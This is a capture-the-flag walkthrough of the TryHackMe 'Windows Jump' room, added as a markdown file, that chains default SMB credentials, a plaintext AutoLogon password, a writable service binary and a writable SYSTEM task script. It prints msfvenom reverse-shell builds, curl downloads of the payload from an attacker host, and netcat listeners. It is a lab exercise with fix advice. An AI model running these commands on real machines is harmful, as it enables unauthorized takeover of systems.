@@ -1,0 +1,206 @@
+---
+title: 'Windows Jump'
+description: 'Default creds on a guest-readable SMB share give RDP access, a clear-text AutoLogon password in the registry gives a second user, a world-writable service binary hands over a service account, and a writable SYSTEM scheduled-task script gives NT AUTHORITYSYSTEM.'
+date: 2026-05-31
+platform: tryhackme
+room: 'Windows Jump'
+roomUrl: 'https://tryhackme.com/room/windowsjump'
+difficulty: easy
+tags:
+  - 'windows'
+  - 'smb'
+  - 'privesc'
+  - 'rdp'
+  - 'autologon'
+  - 'weak-service-permissions'
+  - 'scheduled-tasks'
+vulnClasses:
+  - 'weak credentials'
+  - 'cleartext credentials in registry'
+  - 'weak service executable permissions'
+  - 'writable scheduled task'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Windows Jump — SMB Default Creds, an AutoLogon Leak, a Service Binary, and a SYSTEM Task**
+
+_A walkthrough of the "Windows Jump" challenge from TryHackMe. A Windows host (**`PRIVESC`**) walks us up four classic local-privesc rungs: default credentials left on a guest-readable SMB share, a clear-text AutoLogon password sitting in the registry, a service whose executable is writable by everyone, and a scheduled-task script that SYSTEM runs but a low user can edit. No exploits — just Windows misconfigurations stacked four deep._
+
+> All flags and passwords are redacted. Windows Jump is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Flags are shown as `THM{<redacted>}` and passwords as `<redacted>`; the real values were recovered on the box but are withheld here.
+
+---
+
+### **TL;DR — the whole chain**
+
+<Callout type="tldr">
+
+Guest SMB exposes a `Public` share whose `welcome.txt` holds **default credentials** for `thmuser` → RDP in as `thmuser` → `reg query ...\Winlogon` leaks a **clear-text AutoLogon password** (`DefaultUserName=notadmin`, `DefaultPassword=...`) → `runas notadmin` → `wmic` shows the service `THMSvc` runs as `svcadmin`, and `icacls` shows its binary `C:\Windows\THMSVC\svc.exe` is **`Everyone:(F)`** → overwrite it with an `msfvenom` reverse shell and restart the service → shell as `svcadmin` → `C:\Windows\Tasks\cleanup.bat` is run by a **SYSTEM scheduled task** but is **writable by** **`svcadmin`** → append a payload → **NT AUTHORITYSYSTEM**.
+
+Four users, each unlocked by a Windows secret or permission left wide open.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+`nmap` shows a typical Windows surface — SMB, RDP, and WinRM — on a host named `PRIVESC`:
+
+```text
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server   (Target_Name: PRIVESC)
+5985/tcp open  http            Microsoft HTTPAPI (WinRM)
+```
+
+### **Step 1 — SMB default creds, RDP as** **`thmuser`**
+
+The shares are listable as guest, and `Public` holds a welcome note:
+
+```text
+smbclient -L //$IP -N          # Public share is readable
+smbclient //$IP/Public -N
+smb: \> get welcome.txt
+```
+
+```text
+cat welcome.txt
+# Welcome to CORP-NET.
+# New employee default credentials
+# Username : thmuser
+# Password : <redacted>
+# Please change your password after first login.
+```
+
+Those default creds get us an interactive session over RDP:
+
+```text
+xfreerdp3 /v:$IP /u:thmuser /p:'<redacted>' /dynamic-resolution +clipboard /cert:ignore
+```
+
+### **Step 2 — AutoLogon leak, pivot to** **`notadmin`**
+
+Windows stores AutoLogon credentials in the `Winlogon` registry key — in clear text when it is misconfigured:
+
+```text
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# AutoAdminLogon    REG_SZ    1
+# DefaultUserName   REG_SZ    notadmin
+# DefaultPassword   REG_SZ    <redacted>      <- clear-text password
+```
+
+<Callout type="insight">
+
+`AutoAdminLogon=1` with a `DefaultPassword` string means the machine logs a user in automatically — and keeps that password in the registry as plaintext, readable by any local user. It is one of the first places to check on a Windows box; here it hands us the `notadmin` account outright.
+
+</Callout>
+
+Use the leaked password to run a shell as `notadmin`:
+
+```text
+runas /user:notadmin cmd.exe
+# ... whoami -> privesc\notadmin
+more C:\Users\notadmin\Desktop\flag2.txt
+# THM{<redacted>}
+```
+
+### **Step 3 — weak service-binary permissions, become** **`svcadmin`**
+
+Hunting for a service tied to the next user, `wmic` finds one running as `svcadmin`:
+
+```text
+wmic service get name,pathname,startname | findstr /i "svcadmin"
+# THMSvc   C:\Windows\THMSVC\svc.exe   .\svcadmin
+```
+
+The binary's ACL is the bug — `Everyone` has Full Control, so any user can replace it:
+
+```text
+icacls C:\Windows\THMSVC\svc.exe
+# C:\Windows\THMSVC\svc.exe  Everyone:(F)  PRIVESC\notadmin:(I)(F)  ...
+```
+
+Build a reverse-shell executable, drop it over the service binary, and restart the service so it runs our code as `svcadmin`:
+
+```text
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o svc.exe
+# serve it (python3 -m http.server) and pull it down on the target:
+curl http://$ATTACKER_IP:8000/svc.exe -o %TEMP%/svc.exe
+copy /y %TEMP%\svc.exe C:\Windows\THMSVC\svc.exe
+net stop THMSvc & net start THMSvc
+```
+
+```text
+rlwrap nc -lvnp 4444
+# connect from $IP ...
+C:\> whoami
+privesc\svcadmin
+more C:\Users\svcadmin\Desktop\flag3.txt
+# THM{<redacted>}
+```
+
+### **Step 4 — writable SYSTEM scheduled task, to NT AUTHORITYSYSTEM**
+
+`C:\Windows\Tasks` holds an out-of-place `cleanup.bat` — a "delete temp files" script that a scheduled task runs as SYSTEM. `svcadmin` can modify it:
+
+```text
+icacls C:\Windows\Tasks\cleanup.bat
+# cleanup.bat  PRIVESC\svcadmin:(I)(M)   <- Modify
+```
+
+Append a second reverse-shell payload to the script and wait for the task to fire:
+
+```text
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=5555 -f exe -o shell.exe
+curl http://$ATTACKER_IP:8000/shell.exe -o %TEMP%/shell.exe
+echo %TEMP%\shell.exe >> C:\Windows\Tasks\cleanup.bat
+```
+
+```text
+rlwrap nc -lvnp 5555
+# connect from $IP ...
+C:\> whoami
+nt authority\system
+more C:\flag4.txt
+# THM{<redacted>}
+```
+
+SMB default creds → `thmuser` → AutoLogon leak → `notadmin` → service binary → `svcadmin` → SYSTEM task → SYSTEM.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). A guest-readable share with default creds gives initial access, and three independent local-privesc flaws chain to full SYSTEM:
+
+- **Weak/default credentials on a guest-readable share** — interactive access with no real authentication barrier.
+- **Clear-text AutoLogon password in the registry** — any local user reads another account's password.
+- **World-writable service executable** — overwrite-and-restart yields code execution as the service account.
+- **Writable script run by a SYSTEM scheduled task** — direct SYSTEM, the highest local privilege.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Don't ship default creds, and don't leave them on a share.** Force a password change on first logon and remove `welcome.txt`; restrict guest SMB access.
+2. **Avoid AutoLogon; if required, don't store the password in plaintext.** Use the LSA secret mechanism, and treat `DefaultPassword` in `Winlogon` as a reportable exposure.
+3. **Fix service-binary ACLs.** Service executables must be writable only by Administrators/SYSTEM — never `Everyone:(F)`.
+4. **Lock down scheduled-task scripts.** Any file a SYSTEM task runs must be non-writable by lower-privileged users; `C:\Windows\Tasks\cleanup.bat` should be root-owned and read-only to them.
+
+</Callout>
+
+### **Takeaways**
+
+- **Default creds on a share are a free foothold.** Always read every file a guest SMB session exposes.
+- **`Winlogon`** **AutoLogon is a top-tier Windows privesc check.** A plaintext `DefaultPassword` is a whole account handed over.
+- **`icacls`** **on service binaries pays off.** `Everyone:(F)` on an executable a service runs is an instant pivot to that service's account.
+- **SYSTEM runs scheduled tasks — check who can write the script.** A `Modify` ACL on a task's batch file is the shortest path to SYSTEM.
+
+Thanks for reading. Windows Jump is a compact tour of the four misconfigurations that end most real-world Windows boxes — default creds, AutoLogon leaks, weak service ACLs, and writable privileged tasks.
